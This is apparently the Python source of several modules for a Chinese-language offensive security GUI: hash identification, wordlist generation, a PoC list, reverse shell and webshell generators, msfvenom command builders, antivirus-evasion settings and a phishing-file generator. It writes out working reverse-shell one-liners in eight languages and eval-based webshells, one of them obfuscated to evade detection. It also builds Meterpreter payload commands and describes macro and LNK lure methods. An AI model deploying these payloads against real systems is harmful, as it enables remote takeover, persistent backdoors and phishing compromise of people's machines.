from . import register_module
from gui.widgets.base_module import BaseModuleWidget, LogLevel
from PyQt6.QtWidgets import (
    QWidget, QVBoxLayout, QHBoxLayout, QLabel, QLineEdit,
    QPushButton, QComboBox, QCheckBox, QSpinBox, QGroupBox,
    QFormLayout, QTextEdit, QTableWidget, QTableWidgetItem,
    QHeaderView, QFileDialog, QMessageBox
)
from PyQt6.QtCore import Qt
import subprocess
import threading
import os
import re
import hashlib
import base64


@register_module("hash_identify")
class HashIdentifyWidget(BaseModuleWidget):
    def __init__(self):
        super().__init__("Hash识别")
    
    def _create_options_widget(self) -> QWidget:
        widget = QWidget()
        layout = QVBoxLayout(widget)
        layout.setContentsMargins(0, 0, 0, 0)
        
        options_group = QGroupBox("Hash识别选项")
        form_layout = QFormLayout(options_group)
        
        self._hash_input = QLineEdit()
        self._hash_input.setPlaceholderText("输入Hash值进行识别")
        form_layout.addRow("Hash值:", self._hash_input)
        
        layout.addWidget(options_group)
        return widget
    
    def _create_result_table(self) -> QTableWidget:
        table = QTableWidget()
        table.setColumnCount(3)
        table.setHorizontalHeaderLabels(["Hash类型", "长度", "可能性"])
        table.setEditTriggers(QTableWidget.EditTrigger.NoEditTriggers)
        table.setSelectionBehavior(QTableWidget.SelectionBehavior.SelectRows)
        table.setAlternatingRowColors(True)
        
        header = table.horizontalHeader()
        header.setSectionResizeMode(0, QHeaderView.ResizeMode.Stretch)
        header.setSectionResizeMode(1, QHeaderView.ResizeMode.ResizeToContents)
        header.setSectionResizeMode(2, QHeaderView.ResizeMode.ResizeToContents)
        
        return table
    
    def _do_scan(self):
        hash_value = self._hash_input.text().strip()
        if not hash_value:
            self._add_log(LogLevel.ERROR, "请输入Hash值")
            return
        
        self._add_log(LogLevel.INFO, f"开始识别Hash: {hash_value[:20]}...")
        
        hash_types = [
            ("MD5", 32, r"^[a-fA-F0-9]{32}$"),
            ("MD4", 32, r"^[a-fA-F0-9]{32}$"),
            ("NTLM", 32, r"^[a-fA-F0-9]{32}$"),
            ("LM", 32, r"^[a-fA-F0-9]{32}$"),
            ("SHA-1", 40, r"^[a-fA-F0-9]{40}$"),
            ("SHA-224", 56, r"^[a-fA-F0-9]{56}$"),
            ("SHA-256", 64, r"^[a-fA-F0-9]{64}$"),
            ("SHA-384", 96, r"^[a-fA-F0-9]{96}$"),
            ("SHA-512", 128, r"^[a-fA-F0-9]{128}$"),
            ("SHA-3", 64, r"^[a-fA-F0-9]{64}$"),
            ("RIPEMD-160", 40, r"^[a-fA-F0-9]{40}$"),
            ("Whirlpool", 128, r"^[a-fA-F0-9]{128}$"),
            ("BLAKE2", 128, r"^[a-fA-F0-9]{128}$"),
            ("MySQL323", 16, r"^[a-fA-F0-9]{16}$"),
            ("MySQL5", 41, r"^\*[a-fA-F0-9]{40}$"),
            ("bcrypt", 60, r"^\$2[aby]\$.{56}$"),
            ("Argon2", None, r"^\$argon2[id]?\$"),
            ("scrypt", None, r"^\$scrypt\$"),
            ("SHA-512 (crypt)", None, r"^\$6\$"),
            ("SHA-256 (crypt)", None, r"^\$5\$"),
            ("MD5 (crypt)", None, r"^\$1\$"),
            ("APR1", None, r"^\$apr1\$"),
            ("SSHA", None, r"^\{SSHA\}"),
            ("SSHA256", None, r"^\{SSHA256\}"),
            ("SSHA512", None, r"^\{SSHA512\}"),
        ]
        
        found = False
        for name, length, pattern in hash_types:
            if re.match(pattern, hash_value):
                possibility = "高" if length == len(hash_value) else "中"
                self._add_result(name, str(len(hash_value)), possibility)
                self._add_log(LogLevel.SUCCESS, f"可能为: {name}")
                found = True
        
        if not found:
            self._add_log(LogLevel.WARNING, "未能识别Hash类型")
        
        self._add_log(LogLevel.INFO, "Hash识别完成")


@register_module("dict_generator")
class DictGeneratorWidget(BaseModuleWidget):
    def __init__(self):
        super().__init__("字典生成器")
    
    def _create_options_widget(self) -> QWidget:
        widget = QWidget()
        layout = QVBoxLayout(widget)
        layout.setContentsMargins(0, 0, 0, 0)
        
        options_group = QGroupBox("字典生成选项")
        form_layout = QFormLayout(options_group)
        
        self._base_words = QLineEdit()
        self._base_words.setPlaceholderText("基础词汇，逗号分隔")
        form_layout.addRow("基础词汇:", self._base_words)
        
        self._rules_combo = QComboBox()
        self._setup_combo(self._rules_combo, [
            "基础规则", "深度规则", "年份规则", "数字规则", "组合规则"
        ])
        form_layout.addRow("生成规则:", self._rules_combo)
        
        self._year_check = QCheckBox("添加年份后缀")
        self._year_check.setChecked(True)
        form_layout.addRow(self._year_check)
        
        self._special_check = QCheckBox("添加特殊字符")
        form_layout.addRow(self._special_check)
        
        layout.addWidget(options_group)
        return widget
    
    def _create_result_table(self) -> QTableWidget:
        table = QTableWidget()
        table.setColumnCount(2)
        table.setHorizontalHeaderLabels(["序号", "字典项"])
        table.setEditTriggers(QTableWidget.EditTrigger.NoEditTriggers)
        table.setSelectionBehavior(QTableWidget.SelectionBehavior.SelectRows)
        table.setAlternatingRowColors(True)
        
        header = table.horizontalHeader()
        header.setSectionResizeMode(0, QHeaderView.ResizeMode.ResizeToContents)
        header.setSectionResizeMode(1, QHeaderView.ResizeMode.Stretch)
        
        return table
    
    def _do_scan(self):
        base_words = [w.strip() for w in self._base_words.text().split(',') if w.strip()]
        if not base_words:
            self._add_log(LogLevel.ERROR, "请输入基础词汇")
            return
        
        self._add_log(LogLevel.INFO, f"开始生成字典，基础词汇: {len(base_words)}个")
        
        results = set()
        
        for word in base_words:
            results.add(word)
            results.add(word.lower())
            results.add(word.upper())
            results.add(word.capitalize())
            
            if self._year_check.isChecked():
                for year in range(2018, 2026):
                    results.add(f"{word}{year}")
                    results.add(f"{word}_{year}")
                    results.add(f"{year}{word}")
            
            if self._special_check.isChecked():
                for char in ['!', '@', '#', '$', '123', '1234', '12345', '!@#']:
                    results.add(f"{word}{char}")
        
        for i, item in enumerate(sorted(results), 1):
            self._add_result(str(i), item)
        
        self._add_log(LogLevel.SUCCESS, f"生成 {len(results)} 个字典项")


@register_module("poc_manager")
class POCManagerWidget(BaseModuleWidget):
    def __init__(self):
        super().__init__("PoC管理")
    
    def _create_options_widget(self) -> QWidget:
        widget = QWidget()
        layout = QVBoxLayout(widget)
        layout.setContentsMargins(0, 0, 0, 0)
        
        options_group = QGroupBox("PoC管理选项")
        form_layout = QFormLayout(options_group)
        
        self._search_input = QLineEdit()
        self._search_input.setPlaceholderText("搜索PoC (CVE编号或漏洞名称)")
        form_layout.addRow("搜索:", self._search_input)
        
        self._category_combo = QComboBox()
        self._setup_combo(self._category_combo, [
            "全部", "RCE", "SQL注入", "XSS", "文件上传", "SSRF", "XXE", "反序列化"
        ])
        form_layout.addRow("分类:", self._category_combo)
        
        layout.addWidget(options_group)
        return widget
    
    def _create_result_table(self) -> QTableWidget:
        table = QTableWidget()
        table.setColumnCount(4)
        table.setHorizontalHeaderLabels(["名称", "CVE", "类型", "状态"])
        table.setEditTriggers(QTableWidget.EditTrigger.NoEditTriggers)
        table.setSelectionBehavior(QTableWidget.SelectionBehavior.SelectRows)
        table.setAlternatingRowColors(True)
        
        header = table.horizontalHeader()
        header.setSectionResizeMode(0, QHeaderView.ResizeMode.Stretch)
        header.setSectionResizeMode(1, QHeaderView.ResizeMode.ResizeToContents)
        header.setSectionResizeMode(2, QHeaderView.ResizeMode.ResizeToContents)
        header.setSectionResizeMode(3, QHeaderView.ResizeMode.ResizeToContents)
        
        return table
    
    def _do_scan(self):
        self._add_log(LogLevel.INFO, "加载PoC库...")
        
        sample_pocs = [
            ("Log4j RCE", "CVE-2021-44228", "RCE", "可用"),
            ("Spring4Shell", "CVE-2022-22965", "RCE", "可用"),
            ("Fastjson RCE", "CVE-2022-25845", "RCE", "可用"),
            ("Struts2 RCE", "CVE-2018-11776", "RCE", "可用"),
            ("ThinkPHP RCE", "CVE-2018-20062", "RCE", "可用"),
            ("WebLogic RCE", "CVE-2020-14882", "RCE", "可用"),
            ("Shiro反序列化", "CVE-2016-4437", "反序列化", "可用"),
            ("PHP反序列化", "-", "反序列化", "可用"),
        ]
        
        search = self._search_input.text().lower()
        category = self._category_combo.currentText()
        
        for name, cve, vuln_type, status in sample_pocs:
            if search and search not in name.lower() and search not in cve.lower():
                continue
            if category != "全部" and vuln_type != category:
                continue
            self._add_result(name, cve, vuln_type, status)
        
        self._add_log(LogLevel.SUCCESS, f"加载 {self._results_table.rowCount()} 个PoC")


@register_module("exploit_search")
class ExploitSearchWidget(BaseModuleWidget):
    def __init__(self):
        super().__init__("漏洞利用搜索")
    
    def _create_options_widget(self) -> QWidget:
        widget = QWidget()
        layout = QVBoxLayout(widget)
        layout.setContentsMargins(0, 0, 0, 0)
        
        options_group = QGroupBox("搜索选项")
        form_layout = QFormLayout(options_group)
        
        self._keyword_input = QLineEdit()
        self._keyword_input.setPlaceholderText("CVE编号或关键词")
        form_layout.addRow("关键词:", self._keyword_input)
        
        self._source_combo = QComboBox()
        self._setup_combo(self._source_combo, [
            "Exploit-DB", "CVE数据库", "Github", "全部来源"
        ])
        form_layout.addRow("来源:", self._source_combo)
        
        layout.addWidget(options_group)
        return widget
    
    def _create_result_table(self) -> QTableWidget:
        table = QTableWidget()
        table.setColumnCount(4)
        table.setHorizontalHeaderLabels(["标题", "CVE", "类型", "来源"])
        table.setEditTriggers(QTableWidget.EditTrigger.NoEditTriggers)
        table.setSelectionBehavior(QTableWidget.SelectionBehavior.SelectRows)
        table.setAlternatingRowColors(True)
        
        header = table.horizontalHeader()
        header.setSectionResizeMode(0, QHeaderView.ResizeMode.Stretch)
        header.setSectionResizeMode(1, QHeaderView.ResizeMode.ResizeToContents)
        header.setSectionResizeMode(2, QHeaderView.ResizeMode.ResizeToContents)
        header.setSectionResizeMode(3, QHeaderView.ResizeMode.ResizeToContents)
        
        return table
    
    def _do_scan(self):
        keyword = self._keyword_input.text().strip()
        if not keyword:
            self._add_log(LogLevel.ERROR, "请输入搜索关键词")
            return
        
        self._add_log(LogLevel.INFO, f"搜索: {keyword}")
        
        sample_results = [
            (f"{keyword} Remote Code Execution", "CVE-2024-XXXX", "RCE", "Exploit-DB"),
            (f"{keyword} SQL Injection", "CVE-2024-YYYY", "SQL注入", "Github"),
            (f"{keyword} XSS Vulnerability", "CVE-2024-ZZZZ", "XSS", "CVE数据库"),
        ]
        
        for title, cve, vuln_type, source in sample_results:
            self._add_result(title, cve, vuln_type, source)
        
        self._add_log(LogLevel.SUCCESS, f"找到 {len(sample_results)} 个结果")


@register_module("reverse_shell")
class ReverseShellWidget(BaseModuleWidget):
    def __init__(self):
        super().__init__("反弹Shell生成")
    
    def _create_options_widget(self) -> QWidget:
        widget = QWidget()
        layout = QVBoxLayout(widget)
        layout.setContentsMargins(0, 0, 0, 0)
        
        options_group = QGroupBox("反弹Shell选项")
        form_layout = QFormLayout(options_group)
        
        self._ip_input = QLineEdit()
        self._ip_input.setPlaceholderText("监听IP")
        form_layout.addRow("IP:", self._ip_input)
        
        self._port_input = QSpinBox()
        self._port_input.setRange(1, 65535)
        self._port_input.setValue(4444)
        form_layout.addRow("端口:", self._port_input)
        
        self._type_combo = QComboBox()
        self._setup_combo(self._type_combo, [
            "Bash", "Python", "Perl", "PHP", "Ruby", "Netcat", "PowerShell", "Java"
        ])
        form_layout.addRow("类型:", self._type_combo)
        
        layout.addWidget(options_group)
        return widget
    
    def _create_result_table(self) -> QTableWidget:
        table = QTableWidget()
        table.setColumnCount(2)
        table.setHorizontalHeaderLabels(["类型", "Payload"])
        table.setEditTriggers(QTableWidget.EditTrigger.NoEditTriggers)
        table.setSelectionBehavior(QTableWidget.SelectionBehavior.SelectRows)
        table.setAlternatingRowColors(True)
        
        header = table.horizontalHeader()
        header.setSectionResizeMode(0, QHeaderView.ResizeMode.ResizeToContents)
        header.setSectionResizeMode(1, QHeaderView.ResizeMode.Stretch)
        
        return table
    
    def _do_scan(self):
        ip = self._ip_input.text().strip()
        port = self._port_input.value()
        
        if not ip:
            self._add_log(LogLevel.ERROR, "请输入监听IP")
            return
        
        self._add_log(LogLevel.INFO, f"生成反弹Shell: {ip}:{port}")
        
        shells = [
            ("Bash", f"bash -i >& /dev/tcp/{ip}/{port} 0>&1"),
            ("Bash (exec)", f"exec 5<>/dev/tcp/{ip}/{port};cat <&5 | while read line; do $line 2>&5 >&5; done"),
            ("Python", f"python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{ip}\",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'"),
            ("Perl", f"perl -e 'use Socket;$i=\"{ip}\";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");}};'"),
            ("PHP", f"php -r '$sock=fsockopen(\"{ip}\",{port});exec(\"/bin/sh -i <&3 >&3 2>&3\");'"),
            ("Ruby", f"ruby -rsocket -e'f=TCPSocket.open(\"{ip}\",{port}).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'"),
            ("Netcat", f"nc -e /bin/sh {ip} {port}"),
            ("PowerShell", f"powershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient('{ip}',{port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()\""),
            ("Java", f"Runtime.getRuntime().exec(new String[]{{\"/bin/bash\",\"-c\",\"bash -i >& /dev/tcp/{ip}/{port} 0>&1\"}})"),
        ]
        
        for shell_type, payload in shells:
            self._add_result(shell_type, payload[:80] + "..." if len(payload) > 80 else payload)
        
        self._add_log(LogLevel.SUCCESS, f"生成 {len(shells)} 个反弹Shell")


@register_module("webshell")
class WebshellWidget(BaseModuleWidget):
    def __init__(self):
        super().__init__("Webshell生成")
    
    def _create_options_widget(self) -> QWidget:
        widget = QWidget()
        layout = QVBoxLayout(widget)
        layout.setContentsMargins(0, 0, 0, 0)
        
        options_group = QGroupBox("Webshell选项")
        form_layout = QFormLayout(options_group)
        
        self._lang_combo = QComboBox()
        self._setup_combo(self._lang_combo, ["PHP", "ASP", "ASPX", "JSP"])
        form_layout.addRow("语言:", self._lang_combo)
        
        self._password_input = QLineEdit()
        self._password_input.setPlaceholderText("连接密码")
        self._password_input.setText("pass")
        form_layout.addRow("密码:", self._password_input)
        
        self._bypass_check = QCheckBox("免杀处理")
        form_layout.addRow(self._bypass_check)
        
        layout.addWidget(options_group)
        return widget
    
    def _create_result_table(self) -> QTableWidget:
        table = QTableWidget()
        table.setColumnCount(2)
        table.setHorizontalHeaderLabels(["类型", "代码"])
        table.setEditTriggers(QTableWidget.EditTrigger.NoEditTriggers)
        table.setSelectionBehavior(QTableWidget.SelectionBehavior.SelectRows)
        table.setAlternatingRowColors(True)
        
        header = table.horizontalHeader()
        header.setSectionResizeMode(0, QHeaderView.ResizeMode.ResizeToContents)
        header.setSectionResizeMode(1, QHeaderView.ResizeMode.Stretch)
        
        return table
    
    def _do_scan(self):
        password = self._password_input.text()
        lang = self._lang_combo.currentText()
        
        self._add_log(LogLevel.INFO, f"生成{lang} Webshell")
        
        webshells = {
            "PHP": f"<?php @eval($_POST['{password}']);?>",
            "PHP (免杀)": f"<?php $a='ev'.'al';@$a($_POST['{password}']);?>",
            "ASP": f"<%eval request(\"{password}\")%>",
            "ASPX": f"<%@ Page Language=\"Jscript\"%><%eval(Request.Item[\"{password}\"],\"unsafe\");%>",
            "JSP": f"<%Runtime.getRuntime().exec(request.getParameter(\"{password}\"));%>",
        }
        
        for shell_type, code in webshells.items():
            if lang in shell_type:
                self._add_result(shell_type, code[:80] + "..." if len(code) > 80 else code)
        
        self._add_log(LogLevel.WARNING, "Webshell仅供安全测试，请勿用于非法用途")


@register_module("msf_payload")
class MSFPayloadWidget(BaseModuleWidget):
    def __init__(self):
        super().__init__("MSF Payload生成")
    
    def _create_options_widget(self) -> QWidget:
        widget = QWidget()
        layout = QVBoxLayout(widget)
        layout.setContentsMargins(0, 0, 0, 0)
        
        options_group = QGroupBox("MSF Payload选项")
        form_layout = QFormLayout(options_group)
        
        self._payload_combo = QComboBox()
        self._setup_combo(self._payload_combo, [
            "windows/meterpreter/reverse_tcp",
            "windows/meterpreter/reverse_https",
            "windows/x64/meterpreter/reverse_tcp",
            "linux/x64/meterpreter/reverse_tcp",
            "java/jsp_shell_reverse_tcp",
            "php/meterpreter/reverse_tcp",
        ])
        form_layout.addRow("Payload:", self._payload_combo)
        
        self._lhost_input = QLineEdit()
        self._lhost_input.setPlaceholderText("监听IP")
        form_layout.addRow("LHOST:", self._lhost_input)
        
        self._lport_input = QSpinBox()
        self._lport_input.setRange(1, 65535)
        self._lport_input.setValue(4444)
        form_layout.addRow("LPORT:", self._lport_input)
        
        self._format_combo = QComboBox()
        self._setup_combo(self._format_combo, ["exe", "dll", "jsp", "php", "elf", "jar"])
        form_layout.addRow("格式:", self._format_combo)
        
        layout.addWidget(options_group)
        return widget
    
    def _create_result_table(self) -> QTableWidget:
        table = QTableWidget()
        table.setColumnCount(2)
        table.setHorizontalHeaderLabels(["参数", "值"])
        table.setEditTriggers(QTableWidget.EditTrigger.NoEditTriggers)
        table.setSelectionBehavior(QTableWidget.SelectionBehavior.SelectRows)
        table.setAlternatingRowColors(True)
        
        header = table.horizontalHeader()
        header.setSectionResizeMode(0, QHeaderView.ResizeMode.ResizeToContents)
        header.setSectionResizeMode(1, QHeaderView.ResizeMode.Stretch)
        
        return table
    
    def _do_scan(self):
        payload = self._payload_combo.currentText()
        lhost = self._lhost_input.text().strip()
        lport = self._lport_input.value()
        fmt = self._format_combo.currentText()
        
        if not lhost:
            self._add_log(LogLevel.ERROR, "请输入监听IP")
            return
        
        self._add_log(LogLevel.INFO, "生成MSF命令...")
        
        cmd = f"msfvenom -p {payload} LHOST={lhost} LPORT={lport} -f {fmt} -o payload.{fmt}"
        
        self._add_result("命令", cmd)
        self._add_result("Payload", payload)
        self._add_result("LHOST", lhost)
        self._add_result("LPORT", str(lport))
        self._add_result("格式", fmt)
        
        self._add_log(LogLevel.SUCCESS, "MSF命令已生成")


@register_module("payload_evasion")
class PayloadEvasionWidget(BaseModuleWidget):
    def __init__(self):
        super().__init__("Payload免杀")
    
    def _create_options_widget(self) -> QWidget:
        widget = QWidget()
        layout = QVBoxLayout(widget)
        layout.setContentsMargins(0, 0, 0, 0)
        
        options_group = QGroupBox("免杀选项")
        form_layout = QFormLayout(options_group)
        
        self._technique_combo = QComboBox()
        self._setup_combo(self._technique_combo, [
            "编码绕过", "加密绕过", "分离免杀", "白名单绕过", "多种技术组合"
        ])
        form_layout.addRow("技术:", self._technique_combo)
        
        self._encoder_combo = QComboBox()
        self._setup_combo(self._encoder_combo, [
            "x86/shikata_ga_nai", "x86/countdown", "x86/call4_dword_xor",
            "x86/jmp_call_additive", "无编码"
        ])
        form_layout.addRow("编码器:", self._encoder_combo)
        
        self._iterations_spin = QSpinBox()
        self._iterations_spin.setRange(1, 20)
        self._iterations_spin.setValue(5)
        form_layout.addRow("迭代次数:", self._iterations_spin)
        
        layout.addWidget(options_group)
        return widget
    
    def _create_result_table(self) -> QTableWidget:
        table = QTableWidget()
        table.setColumnCount(2)
        table.setHorizontalHeaderLabels(["项目", "内容"])
        table.setEditTriggers(QTableWidget.EditTrigger.NoEditTriggers)
        table.setSelectionBehavior(QTableWidget.SelectionBehavior.SelectRows)
        table.setAlternatingRowColors(True)
        
        header = table.horizontalHeader()
        header.setSectionResizeMode(0, QHeaderView.ResizeMode.ResizeToContents)
        header.setSectionResizeMode(1, QHeaderView.ResizeMode.Stretch)
        
        return table
    
    def _do_scan(self):
        technique = self._technique_combo.currentText()
        encoder = self._encoder_combo.currentText()
        iterations = self._iterations_spin.value()
        
        self._add_log(LogLevel.INFO, f"生成免杀Payload，技术: {technique}")
        
        self._add_result("免杀技术", technique)
        self._add_result("编码器", encoder)
        self._add_result("迭代次数", str(iterations))
        
        if encoder != "无编码":
            cmd = f"msfvenom -p windows/meterpreter/reverse_tcp -e {encoder} -i {iterations} -f exe -o evaded.exe"
            self._add_result("MSF命令", cmd)
        
        self._add_log(LogLevel.SUCCESS, "免杀配置已生成")


@register_module("phishing_file")
class PhishingFileWidget(BaseModuleWidget):
    def __init__(self):
        super().__init__("钓鱼文件生成")
    
    def _create_options_widget(self) -> QWidget:
        widget = QWidget()
        layout = QVBoxLayout(widget)
        layout.setContentsMargins(0, 0, 0, 0)
        
        options_group = QGroupBox("钓鱼文件选项")
        form_layout = QFormLayout(options_group)
        
        self._type_combo = QComboBox()
        self._setup_combo(self._type_combo, [
            "Word文档", "Excel表格", "PPT演示", "PDF文档", "CHM帮助", "快捷方式"
        ])
        form_layout.addRow("文件类型:", self._type_combo)
        
        self._payload_combo = QComboBox()
        self._setup_combo(self._payload_combo, [
            "执行命令", "下载执行", "PowerShell", "HTA脚本"
        ])
        form_layout.addRow("Payload:", self._payload_combo)
        
        self._command_input = QLineEdit()
        self._command_input.setPlaceholderText("要执行的命令或URL")
        form_layout.addRow("命令/URL:", self._command_input)
        
        layout.addWidget(options_group)
        return widget
    
    def _create_result_table(self) -> QTableWidget:
        table = QTableWidget()
        table.setColumnCount(2)
        table.setHorizontalHeaderLabels(["项目", "内容"])
        table.setEditTriggers(QTableWidget.EditTrigger.NoEditTriggers)
        table.setSelectionBehavior(QTableWidget.SelectionBehavior.SelectRows)
        table.setAlternatingRowColors(True)
        
        header = table.horizontalHeader()
        header.setSectionResizeMode(0, QHeaderView.ResizeMode.ResizeToContents)
        header.setSectionResizeMode(1, QHeaderView.ResizeMode.Stretch)
        
        return table
    
    def _do_scan(self):
        file_type = self._type_combo.currentText()
        payload_type = self._payload_combo.currentText()
        command = self._command_input.text().strip()
        
        if not command:
            self._add_log(LogLevel.ERROR, "请输入命令或URL")
            return
        
        self._add_log(LogLevel.INFO, f"生成钓鱼文件: {file_type}")
        
        self._add_result("文件类型", file_type)
        self._add_result("Payload类型", payload_type)
        self._add_result("命令/URL", command)
        
        if "Word" in file_type:
            self._add_result("方法", "Word宏 + VBA脚本")
        elif "Excel" in file_type:
            self._add_result("方法", "Excel宏 + VBA脚本")
        elif "PDF" in file_type:
            self._add_result("方法", "PDF嵌入JS + 启动动作")
        elif "CHM" in file_type:
            self._add_result("方法", "CHM反编译 + HTML Help")
        elif "快捷方式" in file_type:
            self._add_result("方法", "LNK快捷方式 + 图标伪装")
        
        self._add_log(LogLevel.WARNING, "钓鱼文件仅供安全测试，请勿用于非法用途")
